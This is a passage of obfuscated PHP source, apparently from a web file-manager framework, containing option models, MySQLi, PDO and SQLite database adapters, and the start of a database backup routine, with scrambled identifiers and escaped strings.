($ÁÙ¸´ì) { return !0; } $âÜÁå¨‡ = array($×‹§´Ï[2474] => $ï·ö÷ª[$×‹§´Ï[478]], $×‹§´Ï[32] => $ï·ö÷ª[$×‹§´Ï[32]], $×‹§´Ï[207] => $ï·ö÷ª[$×‹§´Ï[207]], $×‹§´Ï[33] => isset($ï·ö÷ª[$×‹§´Ï[33]]) ? $ï·ö÷ª[$×‹§´Ï[33]] : 1, $×‹§´Ï[2475] => isset($ï·ö÷ª[$×‹§´Ï[2475]]) ? $ï·ö÷ª[$×‹§´Ï[2475]] : 0, $×‹§´Ï[824] => 0, $×‹§´Ï[229] => 0); return parent::insert($âÜÁå¨‡); } public function userNoticeEdit($Ó€®‡ªÙ, $ÅÜà”¶‚) { $this->initUserOption(); return parent::update($Ó€®‡ªÙ, $ÅÜà”¶‚); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\137\x6f\x70\x74\151\157\156"; protected $jsonField = array("\155\x65\156\165", "\x72\x6f\x6c\145", "\162\x6f\x6c\x65\x47\x72\157\165\x70", "\162\x65\x67\x69\163\x74", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($Å©Ÿó) { return "\123\171\x73\164\145\x6d\x4f\x70\164\151\x6f\x6e\x5f{$Å©Ÿó}"; } protected function optionDefault($ÁÆàº‘Á = '') { $¯¾ÖµßÑ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ÁÆàº‘Á == $¯¾ÖµßÑ[12]) { return $GLOBALS[$¯¾ÖµßÑ[6]][$¯¾ÖµßÑ[460]]; } } } goto cò”Ô•½ñï; fñÉâ—öİ: class DbMysqli extends Db { public function __construct($˜„¥åËç = '') { $ÍÁ¨—ÌŒ =& $_SERVER[¼¥ÊĞÙÌ]; if (!extension_loaded($ÍÁ¨—ÌŒ[998])) { think_exception(think_lang($ÍÁ¨—ÌŒ[14]) . $ÍÁ¨—ÌŒ[999]); } if (!empty($˜„¥åËç)) { $this->config = $˜„¥åËç; if (empty($this->config[$ÍÁ¨—ÌŒ[17]])) { $this->config[$ÍÁ¨—ÌŒ[17]] = $ÍÁ¨—ÌŒ[12]; } } } public function connect($êÂ‹èœ­ = '', $¿ö«­ = 0) { $‹Å—Ì—¬ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->linkID[$¿ö«­])) { if (empty($êÂ‹èœ­)) { $êÂ‹èœ­ = $this->config; } $this->linkID[$¿ö«­] = new mysqli($êÂ‹èœ­[$‹Å—Ì—¬[972]], $êÂ‹èœ­[$‹Å—Ì—¬[974]], $êÂ‹èœ­[$‹Å—Ì—¬[975]], $êÂ‹èœ­[$‹Å—Ì—¬[21]], $êÂ‹èœ­[$‹Å—Ì—¬[973]] ? intval($êÂ‹èœ­[$‹Å—Ì—¬[973]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Õãë»¬ï = $this->linkID[$¿ö«­]->server_version; $this->linkID[$¿ö«­]->query($‹Å—Ì—¬[976] . think_config($‹Å—Ì—¬[977]) . $‹Å—Ì—¬[58]); if ($Õãë»¬ï > $‹Å—Ì—¬[978]) { $this->linkID[$¿ö«­]->query($‹Å—Ì—¬[979]); } $this->connected = !0; if (1 != think_config($‹Å—Ì—¬[22])) { unset($this->config); } } return $this->linkID[$¿ö«­]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ë¡†ÓÈø) { $´ïôìÓ„ =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ë¡†ÓÈø; if ($this->queryID) { $this->free(); } think_action_status($´ïôìÓ„[23], 1); think_status($´ïôìÓ„[24]); $this->queryID = $this->_linkID->query($ë¡†ÓÈø); if ($this->_linkID->more_results()) { while (($¢ÆÚæÙª = $this->_linkID->next_result()) != NULL) { $¢ÆÚæÙª->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ëé±›Ì) { $çÂå¤¸› =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëé±›Ì; if ($this->queryID) { $this->free(); } think_action_status($çÂå¤¸›[25], 1); think_status($çÂå¤¸›[24]); $²¤®ú¤ = $this->_linkID->query($ëé±›Ì); $this->debug(); if (!1 === $²¤®ú¤) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ã±Í£ìæ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ã±Í£ìæ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $êÔäÂ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$êÔäÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $â¢¡„£Ÿ = array(); if ($this->numRows > 0) { for ($»öï€·§ = 0; $»öï€·§ < $this->numRows; $»öï€·§++) { $â¢¡„£Ÿ[$»öï€·§] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $â¢¡„£Ÿ; } public function getFields($ôŞ½¬àÈ) { $Äõú¥® =& $_SERVER[¼¥ÊĞÙÌ]; $¶¢§»ïİ = $this->query($Äõú¥®[983] . $this->parseKey($ôŞ½¬àÈ)); $¨ë‘ı ± = array(); if ($¶¢§»ïİ) { foreach ($¶¢§»ïİ as $Í¼¹ôé¨ => $Å¢²¦Ë) { $¨ë‘ı ±[$Å¢²¦Ë[$Äõú¥®[31]]] = array($Äõú¥®[32] => $Å¢²¦Ë[$Äõú¥®[31]], $Äõú¥®[33] => $Å¢²¦Ë[$Äõú¥®[34]], $Äõú¥®[35] => (bool) ($Å¢²¦Ë[$Äõú¥®[36]] === $Äõú¥®[12]), $Äõú¥®[37] => $Å¢²¦Ë[$Äõú¥®[38]], $Äõú¥®[39] => strtolower($Å¢²¦Ë[$Äõú¥®[40]]) == $Äõú¥®[41], $Äõú¥®[42] => strtolower($Å¢²¦Ë[$Äõú¥®[43]]) == $Äõú¥®[44]); } } return $¨ë‘ı ±; } public function getTables($ÑŞ¸¤å· = '') { $…É°¤ıÁ =& $_SERVER[¼¥ÊĞÙÌ]; $ÏŸÒÛç– = !empty($ÑŞ¸¤å·) ? $…É°¤ıÁ[985] . $ÑŞ¸¤å· . $…É°¤ıÁ[986] : $…É°¤ıÁ[987]; $¶½±å¯‡ = $this->query($ÏŸÒÛç–); $€¡’·©ğ = array(); if ($¶½±å¯‡) { foreach ($¶½±å¯‡ as $áÇ™¹Ş => $‡ù¹ØÅŸ) { $€¡’·©ğ[$áÇ™¹Ş] = current($‡ù¹ØÅŸ); } } return $€¡’·©ğ; } public function replace($˜£Ã€Œ, $é—¾ å‚ = array()) { $’“Öã =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($˜£Ã€Œ as $¤ª¡óÍ => $Õªû·Ë½) { $¤¾Ì©‡ø = $this->parseValue($Õªû·Ë½); if (is_scalar($¤¾Ì©‡ø)) { $“İÎÚÁñ[] = $¤¾Ì©‡ø; $ñòÑ×œù[] = $this->parseKey($¤ª¡óÍ); } } $€Îí‚«Ğ = $’“Öã[988] . $this->parseTable($é—¾ å‚[$’“Öã[359]]) . $’“Öã[989] . implode($’“Öã[50], $ñòÑ×œù) . $’“Öã[990] . implode($’“Öã[50], $“İÎÚÁñ) . $’“Öã[991]; return $this->execute($€Îí‚«Ğ); } public function insertAll($»æ³³–½, $ãšÊâ = array(), $¬ òèÇ¿ = false) { $¨éôßìà =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($»æ³³–½[0])) { return !1; } $ö–œÀŸ = array_keys($»æ³³–½[0]); $š¾ÔÕ¯ = array(); foreach ($»æ³³–½ as $ÕÔ™Õ•ş) { $´–æôÁÙ = array(); foreach ($ÕÔ™Õ•ş as $·éùöïâ => $Š‡ÃºØï) { $Š‡ÃºØï = $this->parseValue($Š‡ÃºØï); if (is_scalar($Š‡ÃºØï)) { $´–æôÁÙ[] = $Š‡ÃºØï; } } $š¾ÔÕ¯[] = $¨éôßìà[340] . implode($¨éôßìà[50], $´–æôÁÙ) . $¨éôßìà[991]; } array_walk($ö–œÀŸ, array($this, $¨éôßìà[992])); $×ä°„Ê™ = $¬ òèÇ¿ ? $¨éôßìà[993] : $¨éôßìà[994]; $¡’îñœ = $×ä°„Ê™ . $¨éôßìà[995] . $this->parseTable($ãšÊâ[$¨éôßìà[359]]) . $¨éôßìà[989] . implode($¨éôßìà[50], $ö–œÀŸ) . $¨éôßìà[996] . implode($¨éôßìà[50], $š¾ÔÕ¯); return $this->execute($¡’îñœ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $“è…Š”Ö =& $_SERVER[¼¥ÊĞÙÌ]; $this->error = $this->_linkID->errno . $“è…Š”Ö[4] . $this->_linkID->error; if ($“è…Š”Ö[12] != $this->queryStr) { $this->error .= LNG($“è…Š”Ö[48]) . $this->queryStr; } think_trace($this->error, $“è…Š”Ö[12], $“è…Š”Ö[49]); return $this->error; } public function escapeString($à¥“€—é) { if ($this->_linkID) { return $this->_linkID->real_escape_string($à¥“€—é); } else { return addslashes($à¥“€—é); } } public function parseKey(&$ÖŸÙ×»Ü, $˜¬Â”» = true) { $âÅ÷ÂíÉ =& $_SERVER[¼¥ÊĞÙÌ]; if ($˜¬Â”») { $ÖŸÙ×»Ü = $this->parseKeyCheck($ÖŸÙ×»Ü); } if ($ÖŸÙ×»Ü != $âÅ÷ÂíÉ[223] && !preg_match($âÅ÷ÂíÉ[997], $ÖŸÙ×»Ü)) { $ÖŸÙ×»Ü = $âÅ÷ÂíÉ[464] . trim($ÖŸÙ×»Ü, $âÅ÷ÂíÉ[464]) . $âÅ÷ÂíÉ[464]; } return $ÖŸÙ×»Ü; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($åú£ª¾å = '') { $ßêÊ»Ä =& $_SERVER[¼¥ÊĞÙÌ]; if (!class_exists($ßêÊ»Ä[1000])) { think_exception(think_lang($ßêÊ»Ä[14]) . $ßêÊ»Ä[1001]); } if (!empty($åú£ª¾å)) { $this->config = $åú£ª¾å; if (empty($this->config[$ßêÊ»Ä[17]])) { $this->config[$ßêÊ»Ä[17]] = array(); } } } public function connect($‚Ü ŠÚ = '', $¾’íşÛ = 0) { $Âåº¤çã =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->linkID[$¾’íşÛ])) { if (empty($‚Ü ŠÚ)) { $‚Ü ŠÚ = $this->config; } $èšë³¡’ = !empty($‚Ü ŠÚ[$Âåº¤çã[17]][$Âåº¤çã[18]]) ? $‚Ü ŠÚ[$Âåº¤çã[17]][$Âåº¤çã[18]] : $this->pconnect; if ($èšë³¡’) { $‚Ü ŠÚ[$Âåº¤çã[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¾’íşÛ] = new PDO($‚Ü ŠÚ[$Âåº¤çã[1002]], $‚Ü ŠÚ[$Âåº¤çã[974]], $‚Ü ŠÚ[$Âåº¤çã[975]], $‚Ü ŠÚ[$Âåº¤çã[17]]); } catch (PDOException $Ê² äÍ´) { think_exception($Ê² äÍ´->getMessage()); } $this->dbType = $this->_getDsnType($‚Ü ŠÚ[$Âåº¤çã[1002]]); if (in_array($this->dbType, array($Âåº¤çã[1003], $Âåº¤çã[1004], $Âåº¤çã[1005], $Âåº¤çã[1006]))) { think_exception($Âåº¤çã[1007] . $this->dbType . $Âåº¤çã[1008] . $this->dbType . $Âåº¤çã[1009]); } if (!$this->linkID[$¾’íşÛ]) { think_exception($Âåº¤çã[1010]); } try { $this->linkID[$¾’íşÛ]->exec($Âåº¤çã[1011] . think_config($Âåº¤çã[977])); } catch (Exception $Ê² äÍ´) { } $this->connected = !0; if (1 != think_config($Âåº¤çã[22])) { unset($this->config); } } return $this->linkID[$¾’íşÛ]; } public function free() { $this->PDOStatement = null; } public function query($°Ò½ƒİ, $¶Ê¶œ¹í = array()) { $Öß’ãğ† =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $°Ò½ƒİ; if (!empty($¶Ê¶œ¹í)) { $this->queryStr .= $Öß’ãğ†[1012] . print_r($¶Ê¶œ¹í, !0) . $Öß’ãğ†[1013]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Öß’ãğ†[23], 1); think_status($Öß’ãğ†[24]); $this->PDOStatement = $this->_linkID->prepare($°Ò½ƒİ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÕÛˆ¡á = $this->PDOStatement->execute($¶Ê¶œ¹í); $this->debug(); if (!1 === $ÕÛˆ¡á) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÌÈĞı©, $Ó”¹áëß = array()) { $ÔÉÌÉ‡‹ =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌÈĞı©; if (!empty($Ó”¹áëß)) { $this->queryStr .= $ÔÉÌÉ‡‹[1012] . print_r($Ó”¹áëß, !0) . $ÔÉÌÉ‡‹[1013]; } $îš¨Ö“ = !1; if ($this->dbType == $ÔÉÌÉ‡‹[1006]) { if (preg_match($ÔÉÌÉ‡‹[1014], $this->queryStr, $×ñáØÍ)) { $this->table = think_config($ÔÉÌÉ‡‹[1015]) . str_ireplace(think_config($ÔÉÌÉ‡‹[1016]), $ÔÉÌÉ‡‹[457], $×ñáØÍ[2]); $îš¨Ö“ = (bool) $this->query($ÔÉÌÉ‡‹[1017] . strtoupper($this->table) . $ÔÉÌÉ‡‹[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÔÉÌÉ‡‹[25], 1); think_status($ÔÉÌÉ‡‹[24]); $this->PDOStatement = $this->_linkID->prepare($ÌÈĞı©); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ŞµÏë…® = $this->PDOStatement->execute($Ó”¹áëß); $this->debug(); if (!1 === $ŞµÏë…®) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($îš¨Ö“ || preg_match($ÔÉÌÉ‡‹[1018], $ÌÈĞı©)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $à…™æ½Œ = $this->_linkID->commit(); $this->transTimes = 0; if (!$à…™æ½Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ç©¬Ë·ñ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ç©¬Ë·ñ) { $this->error(); return !1; } } return !0; } private function getAll() { $´õó¹¦¡ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($´õó¹¦¡); return $´õó¹¦¡; } public function getFields($„ĞÓê) { $ËÅø–íü =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (think_config($ËÅø–íü[1019])) { $åÇâºÊÁ = str_replace($ËÅø–íü[1020], $„ĞÓê, think_config($ËÅø–íü[1019])); } else { switch ($this->dbType) { case $ËÅø–íü[1003]: case $ËÅø–íü[1021]: $åÇâºÊÁ = "\x53\105\x4c\105\x43\x54\x20\x20\40\x63\x6f\154\165\155\156\137\156\x61\155\x65\x20\x61\163\40\x27\116\141\155\145\47\x2c\x20\x20\40\x64\x61\164\141\x5f\164\x79\x70\145\x20\141\163\x20\47\x54\171\x70\x65\47\54\x20\40\40\143\157\x6c\165\155\x6e\x5f\x64\145\146\141\x75\x6c\x74\x20\x61\163\x20\47\104\x65\x66\141\x75\x6c\164\x27\54\40\40\x20\151\163\x5f\156\x75\154\x6c\141\142\154\145\40\141\163\x20\x27\x4e\x75\x6c\154\47\xa\11\11\106\122\117\115\x9\x69\x6e\x66\x6f\162\155\141\164\151\157\156\137\163\x63\150\x65\155\x61\x2e\x74\x61\x62\154\x65\x73\40\101\123\40\x74\12\11\x9\112\x4f\111\x4e\11\151\156\146\157\x72\x6d\141\164\151\x6f\x6e\x5f\163\143\x68\145\155\x61\x2e\x63\157\154\x75\x6d\156\163\x20\x41\x53\x20\143\12\11\11\117\x4e\x20\x20\164\56\x74\x61\x62\154\x65\x5f\143\x61\164\x61\x6c\157\x67\x20\75\x20\x63\x2e\x74\x61\x62\x6c\x65\x5f\x63\x61\164\x61\x6c\x6f\x67\xa\x9\11\x41\116\x44\40\x74\56\164\x61\142\154\x65\x5f\163\x63\x68\145\x6d\x61\40\x3d\40\x63\x2e\x74\141\x62\x6c\x65\x5f\x73\x63\150\x65\x6d\x61\12\11\11\101\116\x44\x20\x74\x2e\x74\x61\142\154\x65\x5f\x6e\141\155\x65\x20\75\40\143\x2e\x74\141\x62\x6c\145\x5f\156\141\x6d\145\12\11\x9\x57\x48\x45\122\x45\40\40\40\x74\x2e\164\x61\142\x6c\x65\137\156\141\155\x65\40\x3d\x20\x27{$„ĞÓê}\x27"; break; case $ËÅø–íü[1022]: $åÇâºÊÁ = $ËÅø–íü[1023] . $„ĞÓê . $ËÅø–íü[1024]; break; case $ËÅø–íü[1004]: case $ËÅø–íü[1006]: $åÇâºÊÁ = $ËÅø–íü[1025] . $ËÅø–íü[1026] . $ËÅø–íü[1027] . strtoupper($„ĞÓê) . $ËÅø–íü[1028] . strtoupper($„ĞÓê) . $ËÅø–íü[1029]; break; case $ËÅø–íü[1030]: $åÇâºÊÁ = $ËÅø–íü[1031] . $„ĞÓê . $ËÅø–íü[1032]; break; case $ËÅø–íü[1005]: break; case $ËÅø–íü[1033]: default: $åÇâºÊÁ = $ËÅø–íü[1034] . ($this->dbType == $ËÅø–íü[1033] ? "\140{$„ĞÓê}\x60" : $„ĞÓê); } } $«úëï…Ÿ = $this->query($åÇâºÊÁ); $§¬±âÄ¥ = array(); if ($«úëï…Ÿ) { foreach ($«úëï…Ÿ as $ë°€×™£ => $¿¶ñµÇÈ) { $¿¶ñµÇÈ = array_change_key_case($¿¶ñµÇÈ); $¿¶ñµÇÈ[$ËÅø–íü[32]] = isset($¿¶ñµÇÈ[$ËÅø–íü[32]]) ? $¿¶ñµÇÈ[$ËÅø–íü[32]] : $ËÅø–íü[457]; $¿¶ñµÇÈ[$ËÅø–íü[33]] = isset($¿¶ñµÇÈ[$ËÅø–íü[33]]) ? $¿¶ñµÇÈ[$ËÅø–íü[33]] : $ËÅø–íü[457]; $£Ğ®‰¯ = isset($¿¶ñµÇÈ[$ËÅø–íü[353]]) ? $¿¶ñµÇÈ[$ËÅø–íü[353]] : $¿¶ñµÇÈ[$ËÅø–íü[32]]; $§¬±âÄ¥[$£Ğ®‰¯] = array($ËÅø–íü[32] => $£Ğ®‰¯, $ËÅø–íü[33] => $¿¶ñµÇÈ[$ËÅø–íü[33]], $ËÅø–íü[35] => (bool) (isset($¿¶ñµÇÈ[$ËÅø–íü[106]]) && $¿¶ñµÇÈ[$ËÅø–íü[106]] === $ËÅø–íü[12] || isset($¿¶ñµÇÈ[$ËÅø–íü[35]]) && $¿¶ñµÇÈ[$ËÅø–íü[35]] === $ËÅø–íü[12]), $ËÅø–íü[37] => isset($¿¶ñµÇÈ[$ËÅø–íü[37]]) ? $¿¶ñµÇÈ[$ËÅø–íü[37]] : (isset($¿¶ñµÇÈ[$ËÅø–íü[56]]) ? $¿¶ñµÇÈ[$ËÅø–íü[56]] : $ËÅø–íü[457]), $ËÅø–íü[39] => isset($¿¶ñµÇÈ[$ËÅø–íü[97]]) ? strtolower($¿¶ñµÇÈ[$ËÅø–íü[97]]) == $ËÅø–íü[41] : (isset($¿¶ñµÇÈ[$ËÅø–íü[57]]) ? $¿¶ñµÇÈ[$ËÅø–íü[57]] : !1), $ËÅø–íü[42] => isset($¿¶ñµÇÈ[$ËÅø–íü[1035]]) ? strtolower($¿¶ñµÇÈ[$ËÅø–íü[1035]]) == $ËÅø–íü[44] : (isset($¿¶ñµÇÈ[$ËÅø–íü[97]]) ? $¿¶ñµÇÈ[$ËÅø–íü[97]] : !1)); } } return $§¬±âÄ¥; } public function getTables($Ü°ëüÙ‘ = '') { $¶‹¤ÖÆ =& $_SERVER[¼¥ÊĞÙÌ]; if (think_config($¶‹¤ÖÆ[1036])) { $ªîÚŒú = str_replace($¶‹¤ÖÆ[1037], $Ü°ëüÙ‘, think_config($¶‹¤ÖÆ[1036])); } else { switch ($this->dbType) { case $¶‹¤ÖÆ[1004]: case $¶‹¤ÖÆ[1006]: $ªîÚŒú = $¶‹¤ÖÆ[1038]; break; case $¶‹¤ÖÆ[1003]: case $¶‹¤ÖÆ[1021]: $ªîÚŒú = $¶‹¤ÖÆ[1039]; break; case $¶‹¤ÖÆ[1030]: $ªîÚŒú = $¶‹¤ÖÆ[1040]; break; case $¶‹¤ÖÆ[1005]: think_exception(think_lang($¶‹¤ÖÆ[1041]) . $¶‹¤ÖÆ[1042]); break; case $¶‹¤ÖÆ[1022]: $ªîÚŒú = $¶‹¤ÖÆ[45] . $¶‹¤ÖÆ[46] . $¶‹¤ÖÆ[47]; break; case $¶‹¤ÖÆ[1033]: default: if (!empty($Ü°ëüÙ‘)) { $ªîÚŒú = $¶‹¤ÖÆ[985] . $Ü°ëüÙ‘ . $¶‹¤ÖÆ[986]; } else { $ªîÚŒú = $¶‹¤ÖÆ[987]; } } } $ñœ•èï = $this->query($ªîÚŒú); $ŸÛúÖ¹– = array(); foreach ($ñœ•èï as $› éÅÈß => $¾á ®Ë) { $ŸÛúÖ¹–[$› éÅÈß] = current($¾á ®Ë); } return $ŸÛúÖ¹–; } protected function parseLimit($Á°Œº¸) { $ÇÀ•Û€ =& $_SERVER[¼¥ÊĞÙÌ]; $ºŒ™úĞ = $ÇÀ•Û€[12]; if (!empty($Á°Œº¸)) { switch ($this->dbType) { case $ÇÀ•Û€[1030]: case $ÇÀ•Û€[1022]: $Á°Œº¸ = explode($ÇÀ•Û€[50], $Á°Œº¸); if (count($Á°Œº¸) > 1) { $ºŒ™úĞ .= $ÇÀ•Û€[51] . $Á°Œº¸[1] . $ÇÀ•Û€[52] . $Á°Œº¸[0] . $ÇÀ•Û€[53]; } else { $ºŒ™úĞ .= $ÇÀ•Û€[51] . $Á°Œº¸[0] . $ÇÀ•Û€[53]; } break; case $ÇÀ•Û€[1003]: case $ÇÀ•Û€[1021]: break; case $ÇÀ•Û€[1005]: break; case $ÇÀ•Û€[1004]: case $ÇÀ•Û€[1006]: break; case $ÇÀ•Û€[1033]: default: $ºŒ™úĞ .= $ÇÀ•Û€[51] . $Á°Œº¸ . $ÇÀ•Û€[53]; } } return $ºŒ™úĞ; } public function parseKey(&$ûÌÇôœÄ, $°îéüù§ = true) { $§Š˜“áì =& $_SERVER[¼¥ÊĞÙÌ]; if ($°îéüù§) { $ûÌÇôœÄ = $this->parseKeyCheck($ûÌÇôœÄ); } if ($this->dbType == $§Š˜“áì[1033]) { if ($ûÌÇôœÄ != $§Š˜“áì[223] && !preg_match($§Š˜“áì[997], $ûÌÇôœÄ)) { $ûÌÇôœÄ = $§Š˜“áì[464] . trim($ûÌÇôœÄ, $§Š˜“áì[464]) . $§Š˜“áì[464]; } return $ûÌÇôœÄ; } else { return parent::parseKey($ûÌÇôœÄ, $°îéüù§); } } public function close() { $this->_linkID = null; } public function error() { $‹ó¯Íºâ =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->PDOStatement) { $ü¼Ëçô = $this->PDOStatement->errorInfo(); $this->error = $ü¼Ëçô[1] . $‹ó¯Íºâ[4] . $ü¼Ëçô[2]; } else { $this->error = $‹ó¯Íºâ[12]; } if ($‹ó¯Íºâ[12] != $this->queryStr) { $this->error .= LNG($‹ó¯Íºâ[48]) . $this->queryStr; } think_trace($this->error, $‹ó¯Íºâ[12], $‹ó¯Íºâ[49]); return $this->error; } public function escapeString($œ·şÖı¶) { $“ ›ñ¦æ =& $_SERVER[¼¥ÊĞÙÌ]; switch ($this->dbType) { case $“ ›ñ¦æ[1030]: case $“ ›ñ¦æ[1003]: case $“ ›ñ¦æ[1021]: case $“ ›ñ¦æ[1033]: return addslashes($œ·şÖı¶); case $“ ›ñ¦æ[1005]: case $“ ›ñ¦æ[1022]: case $“ ›ñ¦æ[1004]: case $“ ›ñ¦æ[1006]: return str_ireplace($“ ›ñ¦æ[58], $“ ›ñ¦æ[59], $œ·şÖı¶); } } protected function parseValue($×ÑÎ™õ½) { $ÊÚÛ›œà =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($×ÑÎ™õ½)) { $¼Ôî»İ¯ = strpos($×ÑÎ™õ½, $ÊÚÛ›œà[4]) === 0 && in_array($×ÑÎ™õ½, array_keys($this->bind)); $×ÑÎ™õ½ = $¼Ôî»İ¯ ? $this->escapeString($×ÑÎ™õ½) : $ÊÚÛ›œà[1043] . $this->escapeString($×ÑÎ™õ½) . $ÊÚÛ›œà[1043]; } elseif (isset($×ÑÎ™õ½[0]) && is_string($×ÑÎ™õ½[0]) && strtolower($×ÑÎ™õ½[0]) == $ÊÚÛ›œà[375]) { $×ÑÎ™õ½ = $this->escapeString($×ÑÎ™õ½[1]); } elseif (is_array($×ÑÎ™õ½)) { $×ÑÎ™õ½ = array_map(array($this, $ÊÚÛ›œà[1044]), $×ÑÎ™õ½); } elseif (is_bool($×ÑÎ™õ½)) { $×ÑÎ™õ½ = $×ÑÎ™õ½ ? $ÊÚÛ›œà[91] : $ÊÚÛ›œà[231]; } elseif (is_null($×ÑÎ™õ½)) { $×ÑÎ™õ½ = $ÊÚÛ›œà[106]; } return $×ÑÎ™õ½; } public function getLastInsertId() { $ŞÈ‹£”ô =& $_SERVER[¼¥ÊĞÙÌ]; switch ($this->dbType) { case $ŞÈ‹£”ô[1030]: case $ŞÈ‹£”ô[1022]: case $ŞÈ‹£”ô[1003]: case $ŞÈ‹£”ô[1021]: case $ŞÈ‹£”ô[1005]: case $ŞÈ‹£”ô[1033]: return $this->_linkID->lastInsertId(); case $ŞÈ‹£”ô[1004]: case $ŞÈ‹£”ô[1006]: $“úıÎ’» = $this->table; $“ëÎ’ï = $this->query("\x53\x45\114\x45\103\124\40{$“úıÎ’»}\56\143\x75\162\162\166\x61\154\40\143\x75\162\162\x76\x61\154\x20\106\x52\117\115\x20\144\165\141\154"); return $“ëÎ’ï ? $“ëÎ’ï[0][$ŞÈ‹£”ô[1045]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ìÃ±ªÚØ) { $¨”¡Ï‰é =& $_SERVER[¼¥ÊĞÙÌ]; if (!CacheLock::fileLock($¨”¡Ï‰é[13])) { return !1; } $Ø»üº°š = parent::query($ìÃ±ªÚØ); CacheLock::fileUnLock($¨”¡Ï‰é[13]); return $Ø»üº°š; } public function execute($ÈıÏü°Æ) { $œş”Î¥ =& $_SERVER[¼¥ÊĞÙÌ]; if (!CacheLock::fileLock($œş”Î¥[13])) { return !1; } $†—‡¯š = parent::execute($ÈıÏü°Æ); CacheLock::fileUnLock($œş”Î¥[13]); return $†—‡¯š; } } goto aÖˆ„†ª³ò; EÄ…Ç··ÉÀ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $çÅ¸Ôğ =& $_SERVER[¼¥ÊĞÙÌ]; $¤ˆöô¡³ = Backup::get(); self::$io = $¤ˆöô¡³[$çÅ¸Ôğ[826]]; self::$name = $¤ˆöô¡³[$çÅ¸Ôğ[32]]; $ùĞ¢×Å¡ = new DbManage(); $ÊÚ‡†ı´ = $ùĞ¢×Å¡->dbType(); $‰Ï‰–ı¦ = array($çÅ¸Ôğ[852] => $ÊÚ‡†ı´, $çÅ¸Ôğ[853] => time()); Backup::set($‰Ï‰–ı¦); $³É«º«¤ = $this->tmpFilesPath() . $çÅ¸Ôğ[854] . self::$name . $çÅ¸Ôğ[8]; del_dir($³É«º«¤); mk_dir($³É«º«¤); $¬ƒ· ê = $İÍè¨š‹ = 0; try { $ÂÖÅ—˜ş = $ùĞ¢×Å¡->db()->getTables(); } catch (Exception $¨ÏÔœ‘é) { Backup::log($çÅ¸Ôğ[855] . $¨ÏÔœ‘é->getMessage()); return !1; } $ÂÖÅ—˜ş = array_diff($ÂÖÅ—˜ş, array($çÅ¸Ôğ[856], $çÅ¸Ôğ[857])); foreach ($ÂÖÅ—˜ş as $İÑ—à²) { if ($İÑ—à² == $çÅ¸Ôğ[858]) { continue; } $¬ƒ· ê += $ùĞ¢×Å¡->model($İÑ—à²)->count(); } $Û»”«¶ = new Task($çÅ¸Ôğ[859], $çÅ¸Ôğ[851], $¬ƒ· ê, LNG($çÅ¸Ôğ[860]) . $çÅ¸Ôğ[861] . LNG($çÅ¸Ôğ[862])); $GLOBALS[$çÅ¸Ôğ[863]] = self::$name; foreach ($ÂÖÅ—˜ş as $İÑ—à²) { $ßºÈ×Ó² = $³É«º«¤ . $İÑ—à² . $çÅ¸Ôğ[864]; if ($İÑ—à² == $çÅ¸Ôğ[858]) { @touch($ßºÈ×Ó²); continue; } $¯ü¢ºáç = null; if ($İÑ—à² == $çÅ¸Ôğ[865] && $¤ˆöô¡³[$çÅ¸Ôğ[171]] == $çÅ¸Ôğ[850]) { $¯ü¢ºáç = self::$io; } $İÍè¨š‹ += $ùĞ¢×Å¡->sqlFromDb($İÑ—à², $ßºÈ×Ó², $Û»”«¶, $¯ü¢ºáç); } unset($GLOBALS[$çÅ¸Ôğ[863]]); $Û»”«¶->end(); if 